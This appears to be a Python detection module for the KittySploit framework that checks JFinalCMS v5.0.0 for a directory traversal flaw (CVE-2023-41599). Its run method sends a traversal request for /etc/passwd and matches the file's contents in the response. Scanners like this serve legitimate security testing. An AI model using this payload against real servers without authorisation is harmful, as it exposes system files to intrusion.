#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""An issue in the component /common/DownController."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'JFinalCMS v5.0.0 - Directory Traversal Detection',
        'description': 'An issue in the component /common/DownController.java of JFinalCMS v5.0.0 allows attackers to execute a directory traversal.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'jrecms', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/wy876/POC/blob/main/JFinalCMS%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E(CVE-2023-41599).md',
            'https://github.com/wy876/POC',
            'https://github.com/xingchennb/POC-',
            'https://github.com/Marco-zcl/POC',
            'https://github.com/d4n-sec/d4n-sec.github.io',
        ],
        'cve': 'CVE-2023-41599',
    }

    def run(self):
        r = self.http_request(method="GET", path='/common/down/file?filekey=/../../../../../../../../../etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='medium',
                reason="JFinalCMS v5.0.0 - Directory Traversal detected",
                path='/common/down/file?filekey=/../../../../../../../../../etc/passwd',
            )
            return True
        return False

